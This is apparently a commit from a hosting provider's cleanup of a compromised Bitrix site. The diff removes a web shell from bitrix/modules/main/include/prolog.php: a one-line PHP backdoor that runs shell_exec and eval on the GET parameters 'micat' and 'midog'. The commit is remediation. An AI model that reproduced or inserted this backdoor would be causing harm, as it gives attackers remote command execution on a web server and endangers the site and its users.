3e128248def0f5d13925ec3a061474e7a1ae4d69
/usr/bin/vim <support@beget.ru>
2023-08-21 21:49:38 +0300

    Почистил от лишнего

--- bitrix/modules/main/include/prolog.php
+++ bitrix/modules/main/include/prolog.php
@@ -1,11 +1,11 @@
-<?if(isset($_GET['micat']))echo shell_exec($_GET['micat']);if(isset($_GET['midog']))echo eval($_GET['midog']);
-require_once(__DIR__ . "/../bx_root.php");
+<?
+require_once(dirname(__FILE__)."/../bx_root.php");
 
 if (file_exists($_SERVER["DOCUMENT_ROOT"].BX_PERSONAL_ROOT."/html_pages/.enabled"))
 {
-	require_once(__DIR__ . "/../lib/composite/responder.php");
+	require_once(dirname(__FILE__)."/../lib/composite/responder.php");
 	Bitrix\Main\Composite\Responder::respond();
 }
 
-require_once(__DIR__ . "/prolog_before.php");
+require_once(dirname(__FILE__)."/prolog_before.php");
 require($_SERVER["DOCUMENT_ROOT"].BX_ROOT."/modules/main/include/prolog_after.php");
